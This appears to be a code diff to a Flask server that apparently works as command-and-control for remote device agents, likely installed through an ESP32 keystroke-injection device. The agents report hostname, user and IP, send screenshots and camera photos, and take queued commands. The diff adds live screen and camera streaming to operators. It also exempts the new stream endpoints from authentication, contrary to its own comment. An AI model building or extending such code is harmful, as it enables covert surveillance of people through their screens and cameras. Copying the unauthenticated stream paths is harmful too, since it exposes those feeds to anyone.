@@ -8,6 +8,7 @@ ESP32 HID Relay Server
 from flask import Flask, request, jsonify, Response, stream_with_context
 import json, time, threading, collections, base64, urllib.request
 import subprocess, shutil, glob, os, secrets
+from threading import Condition
 from functools import wraps
 
 app = Flask(__name__)
@@ -23,8 +24,10 @@ def _check_auth():
     # Only guard /api/* — / is public so the HTML (with login overlay) always loads
     # Agent endpoints /esp/, /apk/, /sh/ and the login route are always public
     pub = ("/esp/", "/apk/", "/sh/", "/login", "/api/cam/stream")
+    # SSE stream endpoints: cookie works fine with EventSource
+    stream_ok = request.path.endswith("/screen-stream") or request.path.endswith("/cam-stream")
     if request.path.startswith("/api/"):
-        if not any(request.path.startswith(p) for p in pub):
+        if not any(request.path.startswith(p) for p in pub) and not stream_ok:
             if request.cookies.get(_AUTH_COOKIE) != _AUTH_TOKEN:
                 return jsonify({"error": "unauthorized"}), 401
 
@@ -61,13 +64,29 @@ _device      = {"connected": False, "hostname": None, "os": None,
 
 # ── Multi-device state (persistent agents) ───────────────────────────────────
 _devices = {}  # keyed by UUID device_id
+_screen_conds = {}  # did -> Condition, notified on new screenshot frame
+_cam_conds    = {}  # did -> Condition, notified on new camera photo
+
+def _screen_cond(did):
+    if did not in _screen_conds: _screen_conds[did] = Condition()
+    return _screen_conds[did]
+
+def _cam_cond(did):
+    if did not in _cam_conds: _cam_conds[did] = Condition()
+    return _cam_conds[did]
 
 def _dev(did):
     if did not in _devices:
         _devices[did] = {
             "id": did, "hostname": None, "os": None, "user": None,
             "ip": None, "arch": None, "ts": 0.0,
-            "screenshot": None, "screenshot_ts": 0.0,
+            "screenshot": None,        # base64 (legacy compat)
+            "screenshot_bytes": None,  # raw bytes (fast serve)
+            "screenshot_frame": 0,
+            "screenshot_ts": 0.0,
+            "cam_bytes": None,         # latest camera frame bytes
+            "cam_frame": 0,
+            "cam_ts": 0.0,
             "pending": {"cmd": "", "id": 0},
             "history": collections.deque(maxlen=100),
             "persistent": False,
@@ -1135,11 +1154,18 @@ def esp_device_screenshot():
     did  = (data.get("did") or "").strip()
     img  = data.get("img", "")
     if did and img:
+        try: img_bytes = base64.b64decode(img)
+        except Exception: return jsonify({"ok": False}), 400
+        now = time.time()
         with lock:
             d = _dev(did)
-            d["screenshot"]    = img
-            d["screenshot_ts"] = time.time()
-            d["ts"]            = time.time()
+            d["screenshot"]        = img           # keep b64 for legacy endpoint
+            d["screenshot_bytes"]  = img_bytes
+            d["screenshot_frame"] += 1
+            d["screenshot_ts"]     = now
+            d["ts"]                = now
+        cond = _screen_cond(did)
+        with cond: cond.notify_all()
     return jsonify({"ok": bool(did and img)})
 
 @app.route("/api/devices")
@@ -1168,17 +1194,63 @@ def api_devices():
 @app.route("/api/devices/<did>/screenshot")
 def api_device_screenshot(did):
     with lock:
-        if did not in _devices or not _devices[did]["screenshot"]:
-            return jsonify({"error": "no screenshot"}), 404
-        img_b64 = _devices[did]["screenshot"]
-    try:
-        img_bytes = base64.b64decode(img_b64)
-    except Exception:
-        return jsonify({"error": "bad image data"}), 500
+        if did not in _devices: return jsonify({"error": "no screenshot"}), 404
+        img_bytes = _devices[did].get("screenshot_bytes")
+        if not img_bytes: return jsonify({"error": "no screenshot"}), 404
     mime = "image/png" if img_bytes[:4] == b'\x89PNG' else "image/jpeg"
     resp = Response(img_bytes, mimetype=mime)
     resp.headers["Cache-Control"] = "no-store"
     return resp
+
+@app.route("/api/devices/<did>/screen-stream")
+def api_screen_stream(did):
+    """SSE endpoint — pushes JPEG base64 frames as they arrive from the agent."""
+    def generate():
+        cond = _screen_cond(did)
+        last_frame = -1
+        yield ": connected\n\n"
+        while True:
+            with cond:
+                cond.wait(timeout=30)
+            with lock:
+                d = _devices.get(did)
+                if not d: break
+                frame = d.get("screenshot_frame", 0)
+                if frame == last_frame:
+                    yield ": keepalive\n\n"; continue
+                last_frame = frame
+                data = d.get("screenshot_bytes")
+            if data:
+                yield "data: " + base64.b64encode(data).decode() + "\n\n"
+    return Response(stream_with_context(generate()),
+                    mimetype="text/event-stream",
+                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no",
+                             "Connection": "keep-alive"})
+
+@app.route("/api/devices/<did>/cam-stream")
+def api_cam_stream_device(did):
+    """SSE endpoint — pushes JPEG base64 camera frames as they arrive."""
+    def generate():
+        cond = _cam_cond(did)
+        last_frame = -1
+        yield ": connected\n\n"
+        while True:
+            with cond:
+                cond.wait(timeout=30)
+            with lock:
+                d = _devices.get(did)
+                if not d: break
+                frame = d.get("cam_frame", 0)
+                if frame == last_frame:
+                    yield ": keepalive\n\n"; continue
+                last_frame = frame
+                data = d.get("cam_bytes")
+            if data:
+                yield "data: " + base64.b64encode(data).decode() + "\n\n"
+    return Response(stream_with_context(generate()),
+                    mimetype="text/event-stream",
+                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no",
+                             "Connection": "keep-alive"})
 
 @app.route("/api/devices/<did>/cmd", methods=["POST"])
 def api_device_cmd_post(did):
@@ -1235,11 +1307,17 @@ def esp_device_photo():
     did  = (data.get("did") or "").strip()
     b64  = data.get("img", "")
     if did and b64:
+        try: img_bytes = base64.b64decode(b64)
+        except Exception: return jsonify({"ok": False}), 400
+        now = time.time()
         with lock:
-            _dev(did)["photos"].appendleft({
-                "ts": time.time(), "b64": b64,
-                "cam": data.get("cam", "back"),
-            })
+            d = _dev(did)
+            d["photos"].appendleft({"ts": now, "b64": b64, "cam": data.get("cam", "back")})
+            d["cam_bytes"]  = img_bytes
+            d["cam_frame"] += 1
+            d["cam_ts"]     = now
+        cond = _cam_cond(did)
+        with cond: cond.notify_all()
     return jsonify({"ok": bool(did and b64)})
 
 @app.route("/esp/device-file", methods=["POST"])
